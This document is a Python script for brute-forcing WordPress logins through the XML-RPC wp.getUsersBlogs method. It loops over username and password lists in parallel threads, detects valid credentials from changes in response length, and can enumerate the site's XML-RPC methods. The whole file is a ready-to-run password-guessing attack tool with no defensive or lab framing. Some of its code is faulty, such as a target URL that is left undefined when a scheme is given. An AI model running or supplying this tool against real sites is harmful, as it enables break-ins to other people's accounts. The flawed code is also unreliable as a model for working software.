import xml.etree.ElementTree as ET
import progressbar
from bs4 import BeautifulSoup
import requests
import threading
from argparse import ArgumentParser, Namespace



#           FUNCTIONS


# Define a function for processing each combination of username and password
def process_combo(username, password):
    # Grab the Content-Length of the website
    initial_request = requests.post(target_url, data=xmlrpc_request_template, timeout=10)
    target_content_length = initial_request.headers['Content-Length']
    
    global credentials_cracked, request_count, xmlrpc_request
    if credentials_cracked:
        return
    
    with lock:
        request_count += 1
        pbar.update(request_count)

    xmlrpc_request= xmlrpc_request_template.format(username, password)

    try:
        req = requests.post(target_url, data=xmlrpc_request, timeout=10)

        if 'Content-Length' in req.headers and int(req.headers['Content-Length'])!=int(target_content_length):
            print(f'\033[1;33m Valid credentials\033[0m: \033[91m{username}\033[0m:\033[91m{password}\033[0m')
            credentials_cracked = True
    except:
        pass



#       VARIABLES
response = None
request_count = 0
credentials_cracked = False
lock = threading.Lock()
xmlrpc_request_template = '''
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>{}</value></param>
<param><value>{}</value></param>
</params>
</methodCall>
'''
xmlrpc_request_call= '''
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
'''

parser = ArgumentParser()
user = parser.add_mutually_exclusive_group(required=True)
passwd = parser.add_mutually_exclusive_group(required=True)

parser.add_argument('-w','--url', type=str, required=True, help='The URL of the target')
user.add_argument('-u','--username', help=' Specifies a single username to use for the attack')
user.add_argument('-U','--userlist', help=' Specifies a list of usernames defined inside a file')
passwd.add_argument('-P','--passlist',  help=' Specifies a file containing a list of passwords to use for the attack')
passwd.add_argument('-p',dest= 'password', help=' Specifies a unique password to use for the attack')
parser.add_argument('-X','--request-method', choices=['GET', 'POST'], default='POST',
                    type=str, help='Choose HTTP Method')
parser.add_argument('-v,--verbose', dest='verbose', action='store_true', required= False, help= 'Prints a list of the available methods found.')


args: Namespace = parser.parse_args()
if not args.url.startswith("http://") and not args.url.startswith("https://"):
    target_url = "http://" + args.url
request_method = args.request_method
http_methods = {
    'GET': requests.get,
    'POST': requests.post
}


if args.username:
    usernames = [args.username]
else:
    with open(args.userlist) as usernames_f:
        usernames = [line.strip() for line in usernames_f]
        usernames_f.close()

if args.password:
    passwords = [args.password]
else:
    with open(args.passlist) as passwords_f:
        passwords = [line.strip() for line in passwords_f]
        passwords_f.close()

#Checks if the server is alive
try:
    response = http_methods[request_method](target_url, timeout=10)
    response.raise_for_status() # Check for any HTTP errors
    print('Target is up and running\n\n')
except requests.exceptions.RequestException as e:
    if response is None:
        print(f"{target_url} is down.")
        exit()
    elif response.status_code == 405:
        print("Method Not Allowed")
        while True:
            reply = input(f"Do you want to try a {'POST' if request_method=='GET' else 'GET'} request instead? [Y/N]").upper()
            if not isinstance(reply, str):
                print('please enter a string')
            else:
                if reply == 'Y':
                    if request_method== 'POST':
                        response = requests.get(target_url,timeout=10)
                    elif request_method =='GET':
                        response = requests.post(target_url, timeout=10)
                    break
                elif reply == 'N':
                    print('Exiting...')
                    exit()
                else:
                    print('Invalid input')
                    continue
    elif response.status_code == 404:
        print("Method not Found")


#Send the POST payload to list available methods in Wordpress site
if args.verbose:
    r = requests.post(target_url, data=xmlrpc_request_call)

#Catches the response of the request and prints the available methods
    post_response = r.content.decode('UTF-8')
    soup = BeautifulSoup(post_response,'xml')
    method_names = [method.string for method in soup.find_all('string')]
    #print(method_names);print("\n\n")
    for methods in method_names:
        print(methods)
    print("\n\n")
else:
    pass

# Creation of the progress bar
widgets = ['[', progressbar.Timer(), '] ', progressbar.Bar(), ' (', progressbar.ETA(), ') ',]
pbar = progressbar.ProgressBar(widgets=widgets, max_value=len(usernames) * len(passwords))


for username in usernames:
    for password in passwords:
        threads_used = threading.Thread(target=process_combo, args=(username, password))
        threads_used.start()

# Wait for all threads to finish
main_thread = threading.current_thread()
for t in threading.enumerate():
    if t is not main_thread:
        t.join()

if not credentials_cracked:
    print("\u001b[1m\033[3m No Valid Credentials credentials_cracked!!!\u001b[0m")


pbar.finish()